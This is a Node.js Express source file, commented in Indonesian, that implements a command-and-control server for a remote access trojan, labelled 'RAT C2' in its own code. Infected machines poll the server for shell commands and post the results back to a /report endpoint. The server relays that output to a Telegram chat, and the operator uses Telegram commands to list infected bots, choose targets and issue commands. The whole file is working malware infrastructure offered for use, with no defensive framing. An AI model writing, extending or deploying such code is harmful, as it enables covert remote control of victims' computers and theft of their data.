const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN_B; // Token Bot RAT
const CHAT_ID = process.env.CHAT_ID;

// --- DATABASE SEMENTARA (MEMORY) ---
let onlineBots = {}; // Menyimpan daftar bot: { "user@pc": timestamp }
let currentTarget = "ALL"; // Default target semua
let commandData = {
    id: 0,      // ID unik agar tidak looping
    cmd: ""     // Perintahnya, misal "whoami"
};

// --- FUNGSI BANTUAN ---
async function sendTelegram(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error("TG Error:", e.message); }
}

// 1. Endpoint Polling (Diakses oleh Malware)
app.post('/poll', async (req, res) => {
    try {
        const { bot_id } = req.body; // Malware wajib kirim ID-nya

        // A. Catat Absen (Heartbeat)
        if (bot_id) {
            onlineBots[bot_id] = Date.now();
        }

        // B. Cek Telegram (Apakah Admin kirim perintah baru?)
        // Kita cek update Telegram hanya jika ada request poll (Trigger)
        // Agar tidak perlu loop interval di server
        await checkTelegramUpdates();

        // C. Logika Pengiriman Perintah
        // Apakah saya (bot ini) adalah target?
        let isTarget = (currentTarget === "ALL" || currentTarget === bot_id);
        
        if (isTarget && commandData.cmd !== "") {
            return res.json({
                status: "command",
                id: commandData.id, // ID Perintah (PENTING untuk anti-loop)
                cmd: commandData.cmd
            });
        }

        return res.json({ status: "idle" });

    } catch (e) {
        res.json({ status: "error" });
    }
});

// 2. Endpoint Laporan Hasil (Diakses oleh Malware)
app.post('/report', async (req, res) => {
    try {
        const { id, aes, chacha } = req.body;
        // aes = Output
        // chacha = Command Asli
        
        const msg = `💻 **${id}**\ncmd: \`${chacha}\`\n\n\`\`\`\n${aes}\n\`\`\``;
        await sendTelegram(msg);
        res.json({ status: 'success' });
    } catch (e) {
        res.json({ status: 'error' });
    }
});

// 3. Fungsi Cek Telegram (Logika Admin)
let lastUpdateId = 0;
async function checkTelegramUpdates() {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
        const resp = await axios.get(url);
        const updates = resp.data.result;

        if (updates.length > 0) {
            for (const update of updates) {
                lastUpdateId = update.update_id;
                const text = update.message ? update.message.text : "";

                if (!text) continue;

                // --- COMMAND LIST ---
                
                // 1. LIHAT BOT ONLINE (/bots)
                if (text === '/bots') {
                    let list = "🤖 **ONLINE BOTS (Last 30s):**\n";
                    let count = 0;
                    const now = Date.now();
                    
                    for (const [id, time] of Object.entries(onlineBots)) {
                        // Hanya tampilkan yang aktif 30 detik terakhir
                        if (now - time < 30000) { 
                            list += `- \`${id}\`\n`;
                            count++;
                        }
                    }
                    if (count === 0) list += "(No bots active)";
                    list += `\n🎯 Target: \`${currentTarget}\``;
                    await sendTelegram(list);
                }

                // 2. PILIH TARGET (/target ID atau /target ALL)
                else if (text.startsWith('/target ')) {
                    const target = text.replace('/target ', '').trim();
                    currentTarget = target;
                    await sendTelegram(`🎯 Target set to: \`${currentTarget}\``);
                }

                // 3. KIRIM PERINTAH (/cmd dir)
                else if (text.startsWith('/cmd ')) {
                    const cmd = text.replace('/cmd ', '').trim();
                    // Update Global Command
                    commandData = {
                        id: Date.now(), // ID baru pakai timestamp (unik)
                        cmd: cmd
                    };
                    await sendTelegram(`🚀 Command sent to **${currentTarget}**: \`${cmd}\``);
                }
            }
        }
    } catch (e) {
        // Ignore error
    }
}

app.listen(PORT, () => console.log(`RAT C2 Running on ${PORT}`));
